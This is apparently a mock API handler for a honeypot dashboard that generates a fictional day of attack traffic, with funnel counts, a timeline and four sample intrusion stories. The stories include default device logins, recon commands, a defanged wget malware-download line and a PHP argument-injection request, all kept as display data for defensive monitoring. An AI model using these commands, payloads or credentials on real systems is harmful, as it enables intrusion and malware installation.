/**
 * MSW handler for GET /story: a fictional day of traffic (documentation addresses only). The
 * funnel is computed from one origin-by-door matrix and one door-by-stage matrix so every
 * session counts once per column and the flows add up, like the real endpoint.
 */
import { delay, http, HttpResponse } from "msw"
import { countryName } from "@/lib/format"
import { SENSOR_META, isSensor } from "@/lib/sensors"
import {
  STAGES,
  STAGE_META,
  type FlowLink,
  type FlowNode,
  type Stage,
  type StoryItem,
  type StoryResponse,
  type TimelineBucket,
} from "@/lib/story"

const HOUR = 3_600_000
const num = (n: number) => n.toLocaleString("en-US")

/** Visits per origin country and door (the last origin stands for "other"). */
const ORIGINS: { key: string; ips: number; asn: string; doors: Record<string, number> }[] = [
  {
    key: "NL",
    ips: 96,
    asn: "AS64500 Example Cloud",
    doors: { ssh: 2810, telnet: 940, web: 360, rdp: 40 },
  },
  {
    key: "CN",
    ips: 141,
    asn: "AS64501 Example Telecom",
    doors: { ssh: 1960, telnet: 1210, web: 220, rdp: 120 },
  },
  {
    key: "US",
    ips: 88,
    asn: "AS64502 Example Hosting",
    doors: { ssh: 1340, telnet: 180, web: 910, rdp: 70 },
  },
  {
    key: "RU",
    ips: 52,
    asn: "AS64503 Example Net",
    doors: { ssh: 1180, telnet: 90, web: 150, rdp: 210 },
  },
  {
    key: "BR",
    ips: 47,
    asn: "AS64504 Example Broadband",
    doors: { ssh: 410, telnet: 880, web: 60, rdp: 20 },
  },
  {
    key: "DE",
    ips: 39,
    asn: "AS64505 Example Colo",
    doors: { ssh: 520, telnet: 40, web: 380, rdp: 30 },
  },
  { key: "other", ips: 149, asn: "", doors: { ssh: 1480, telnet: 620, web: 420, rdp: 90 } },
]

/** Share of each door's visits that reached each stage (rows add up to 1). */
const DEPTH: Record<string, Record<Stage, number>> = {
  ssh: {
    looked: 0.18,
    guessed: 0.6,
    got_in: 0.06,
    commands: 0.13,
    download: 0.025,
    exploit: 0.005,
  },
  telnet: { looked: 0.1, guessed: 0.5, got_in: 0.1, commands: 0.2, download: 0.09, exploit: 0.01 },
  web: { looked: 0.62, guessed: 0.05, got_in: 0, commands: 0, download: 0.03, exploit: 0.3 },
  rdp: { looked: 0.7, guessed: 0.27, got_in: 0.02, commands: 0, download: 0, exploit: 0.01 },
}

const STAGE_HREF: Record<Stage, string> = {
  looked: "/attacks?period=24h",
  guessed: "/attacks?period=24h&tag=brute-force",
  got_in: "/attacks?period=24h&login_success=true",
  commands: "/attacks?period=24h&has_commands=true",
  download: "/attacks?period=24h&tag=malware-drop",
  exploit: "/attacks?period=24h&tag=php2shell",
}

function buildFlow(): { flow: StoryResponse["flow"]; totals: StoryResponse["totals"] } {
  const doorKeys = Object.keys(DEPTH)
  const links: FlowLink[] = []
  const doorTotal = new Map<string, number>()
  const stageTotal = new Map<Stage, number>()
  const originTotal = new Map<string, number>()
  for (const o of ORIGINS) {
    for (const d of doorKeys) {
      const v = o.doors[d] ?? 0
      links.push({ source: `origin:${o.key}`, target: `door:${d}`, value: v })
      doorTotal.set(d, (doorTotal.get(d) ?? 0) + v)
      originTotal.set(o.key, (originTotal.get(o.key) ?? 0) + v)
    }
  }
  for (const d of doorKeys) {
    const total = doorTotal.get(d) ?? 0
    let left = total
    STAGES.forEach((s, i) => {
      const v = i === STAGES.length - 1 ? left : Math.round(total * (DEPTH[d]?.[s] ?? 0))
      left -= v
      links.push({ source: `door:${d}`, target: `stage:${s}`, value: v })
      stageTotal.set(s, (stageTotal.get(s) ?? 0) + v)
    })
  }
  const nodes: FlowNode[] = [
    ...ORIGINS.map((o): FlowNode => ({
      id: `origin:${o.key}`,
      column: "origin",
      key: o.key,
      label: o.key === "other" ? "Other countries" : (countryName(o.key) ?? o.key),
      technical:
        o.key === "other"
          ? `${o.ips} IPs · 31 countries`
          : `ISO ${o.key} · ${o.ips} IPs · top ${o.asn}`,
      sessions: originTotal.get(o.key) ?? 0,
      href: o.key === "other" ? "/attacks?period=24h" : `/attacks?country=${o.key}`,
    })),
    ...doorKeys.map((d): FlowNode => ({
      id: `door:${d}`,
      column: "door",
      key: d,
      label: isSensor(d) ? SENSOR_META[d].label : d,
      technical: isSensor(d) ? `${SENSOR_META[d].description} · port ${SENSOR_META[d].port}` : d,
      sessions: doorTotal.get(d) ?? 0,
      href: `/attacks?sensor=${d}`,
    })),
    ...STAGES.map((s): FlowNode => ({
      id: `stage:${s}`,
      column: "stage",
      key: s,
      label: STAGE_META[s].label,
      technical: `deepest step reached: ${s}`,
      sessions: stageTotal.get(s) ?? 0,
      href: STAGE_HREF[s],
    })),
  ]
  const sessions = [...originTotal.values()].reduce((a, b) => a + b, 0)
  return {
    flow: { nodes, links },
    totals: {
      sessions,
      sources: ORIGINS.reduce((a, o) => a + o.ips, 0),
      countries: 38,
      guessed: (stageTotal.get("guessed") ?? 0) + (stageTotal.get("got_in") ?? 0),
      got_in:
        (stageTotal.get("got_in") ?? 0) +
        (stageTotal.get("commands") ?? 0) +
        (stageTotal.get("download") ?? 0),
      ran_commands: (stageTotal.get("commands") ?? 0) + (stageTotal.get("download") ?? 0),
      downloads: stageTotal.get("download") ?? 0,
      exploits: stageTotal.get("exploit") ?? 0,
    },
  }
}

function buildTimeline(hours: number, total: number): TimelineBucket[] {
  const step = hours <= 6 ? HOUR / 4 : HOUR
  const count = Math.round((hours * HOUR) / step)
  const end = Math.floor(Date.now() / step) * step
  const weights = Array.from({ length: count }, (_, i) => {
    // A calm base with a busy evening, and a spike a few hours ago.
    const wave = 1 + 0.5 * Math.sin((i / count) * Math.PI * 2 - 1)
    const spike = i === count - 5 ? 2.4 : 1
    return wave * spike
  })
  const sum = weights.reduce((a, b) => a + b, 0)
  return weights.map((w, i) => {
    const sessions = Math.round((w / sum) * total)
    const ssh = Math.round(sessions * 0.5)
    const telnet = Math.round(sessions * 0.25)
    const web = Math.round(sessions * 0.2)
    return {
      start: new Date(end - (count - i) * step).toISOString(),
      sessions,
      by_door: { ssh, telnet, web, rdp: sessions - ssh - telnet - web },
      by_stage: { looked: Math.round(sessions * 0.3), guessed: Math.round(sessions * 0.5) },
      severe: i === count - 5 ? 21 : Math.round(sessions * 0.02),
    }
  })
}

function buildStories(): StoryItem[] {
  const now = Date.now()
  const at = (min: number) => new Date(now - min * 60_000).toISOString()
  return [
    {
      session_id: "demo-story-1",
      started_at: at(190),
      ended_at: at(187),
      src_ip: "203.0.113.17",
      country: "NL",
      country_name: "Netherlands",
      asn: 64500,
      org: "Example Cloud",
      sensor: "telnet",
      stage: "download",
      severity: "high",
      title: "A botnet robot broke into the Telnet door and tried to install a virus",
      summary:
        "It guessed 37 passwords in 2 minutes, got in with a default login, looked around, then tried to download a program.",
      steps: [
        {
          ts: at(190),
          kind: "connect",
          plain: "Knocked on the Telnet door",
          technical: "connect · dst 23",
          count: 1,
        },
        {
          ts: at(189),
          kind: "guess",
          plain: "Tried 37 passwords",
          technical: "37 login_attempt · top root/admin, root/1234, admin/admin",
          count: 37,
        },
        {
          ts: at(188),
          kind: "login",
          plain: "A password worked and it got inside",
          technical: "login ok · root/xc3511",
          count: 1,
        },
        {
          ts: at(188),
          kind: "command",
          plain: "Typed 4 commands to look around",
          technical: "uname -a; cat /proc/cpuinfo; ls /tmp; busybox ECCHI",
          count: 4,
        },
        {
          ts: at(187),
          kind: "download",
          plain: "Tried to download a program",
          technical: "wget hxxp://198[.]51[.]100[.]23/bins/arm7 -O /tmp/.x",
          count: 1,
        },
        {
          ts: at(187),
          kind: "disconnect",
          plain: "Left",
          technical: "disconnect · 143 s",
          count: 1,
        },
      ],
      tags: ["mirai", "malware-drop"],
      techniques: [
        { id: "T1110.001", name: "Password Guessing" },
        { id: "T1105", name: "Ingress Tool Transfer" },
      ],
      campaign: { id: 3, name: "Mirai loader over Telnet" },
      href: "/attacks/demo-story-1",
    },
    {
      session_id: "demo-story-2",
      started_at: at(75),
      ended_at: at(75),
      src_ip: "198.51.100.44",
      country: "US",
      country_name: "United States",
      asn: 64502,
      org: "Example Hosting",
      sensor: "web",
      stage: "exploit",
      severity: "high",
      title: "A scanner sent a booby-trapped request to the web door",
      summary: "It tried a known flaw in an old PHP setup, three times in a row, then moved on.",
      steps: [
        {
          ts: at(75),
          kind: "connect",
          plain: "Knocked on the web door",
          technical: "connect · dst 80",
          count: 1,
        },
        {
          ts: at(75),
          kind: "exploit",
          plain: "Sent an exploit for a known flaw (3 times)",
          technical: "POST /index.php?-d+allow_url_include=1 · php2shell · CVE-2026-109618",
          count: 3,
        },
        { ts: at(75), kind: "disconnect", plain: "Left", technical: "disconnect · 2 s", count: 1 },
      ],
      tags: ["php2shell"],
      techniques: [{ id: "T1190", name: "Exploit Public-Facing Application" }],
      campaign: null,
      href: "/attacks/demo-story-2",
    },
    {
      session_id: "demo-story-3",
      started_at: at(300),
      ended_at: at(293),
      src_ip: "192.0.2.58",
      country: "CN",
      country_name: "China",
      asn: 64501,
      org: "Example Telecom",
      sensor: "ssh",
      stage: "commands",
      severity: "medium",
      title: "A robot logged in over SSH and checked what kind of machine it was",
      summary: "It guessed 12 passwords, got in, then typed 6 commands to learn about the system.",
      steps: [
        {
          ts: at(300),
          kind: "connect",
          plain: "Knocked on the SSH door",
          technical: "connect · dst 22",
          count: 1,
        },
        {
          ts: at(299),
          kind: "guess",
          plain: "Tried 12 passwords",
          technical: "12 login_attempt · top root/123456, ubuntu/ubuntu",
          count: 12,
        },
        {
          ts: at(297),
          kind: "login",
          plain: "A password worked and it got inside",
          technical: "login ok · ubuntu/ubuntu",
          count: 1,
        },
        {
          ts: at(296),
          kind: "command",
          plain: "Typed 6 commands to look around",
          technical: "uname -a; nproc; free -m; cat /etc/os-release; w; crontab -l",
          count: 6,
        },
        {
          ts: at(293),
          kind: "disconnect",
          plain: "Left",
          technical: "disconnect · 411 s",
          count: 1,
        },
      ],
      tags: ["recon"],
      techniques: [{ id: "T1082", name: "System Information Discovery" }],
      campaign: null,
      href: "/attacks/demo-story-3",
    },
    {
      session_id: "demo-story-4",
      started_at: at(30),
      ended_at: at(28),
      src_ip: "203.0.113.201",
      country: "RU",
      country_name: "Russia",
      asn: 64503,
      org: "Example Net",
      sensor: "rdp",
      stage: "guessed",
      severity: "low",
      title: "A robot tried to guess the Windows remote desktop password",
      summary: "It tried 58 passwords in 2 minutes and none of them worked.",
      steps: [
        {
          ts: at(30),
          kind: "connect",
          plain: "Knocked on the remote desktop door",
          technical: "connect · dst 3389",
          count: 1,
        },
        {
          ts: at(29),
          kind: "guess",
          plain: "Tried 58 passwords",
          technical: "58 login_attempt · administrator, admin, user1",
          count: 58,
        },
        {
          ts: at(28),
          kind: "disconnect",
          plain: "Gave up",
          technical: "disconnect · 97 s",
          count: 1,
        },
      ],
      tags: [],
      techniques: [{ id: "T1110.001", name: "Password Guessing" }],
      campaign: null,
      href: "/attacks/demo-story-4",
    },
  ]
}

export function buildStory(hours: number): StoryResponse {
  const { flow, totals } = buildFlow()
  return {
    as_of: new Date().toISOString(),
    hours,
    headline: `In the last ${hours} hours, ${num(totals.sources)} machines from ${totals.countries} countries knocked on your decoy doors ${num(totals.sessions)} times. Most were robots guessing passwords.`,
    totals,
    flow,
    timeline: buildTimeline(hours, totals.sessions),
    stories: buildStories(),
  }
}

export const storyHandlers = [
  http.get("/api/v1/story", async ({ request }) => {
    await delay(220)
    const raw = Number(new URL(request.url).searchParams.get("hours") ?? 24)
    const hours = Number.isInteger(raw) && raw >= 1 && raw <= 168 ? raw : 24
    return HttpResponse.json(buildStory(hours))
  }),
]
